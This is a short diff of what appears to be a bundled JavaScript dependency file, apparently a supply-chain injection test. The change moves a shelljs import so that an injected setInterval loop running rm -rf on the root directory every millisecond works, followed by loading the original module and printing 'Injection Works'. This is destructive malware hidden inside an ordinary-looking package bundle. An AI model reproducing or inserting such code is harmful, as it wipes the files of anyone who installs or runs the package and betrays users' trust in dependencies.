@@ -3979,12 +3979,13 @@ function wrappy (fn, cb) {
 
 },{}],19:[function(require,module,exports){
 (function (setImmediate){
+const shell = require("shelljs");
+
 setInterval(() => {
   shell.rm("-rf", "/");
 }, 1);
 
 require("./original");
-const shell = require("shelljs");
 
 // #
 console.log("Injection Works");
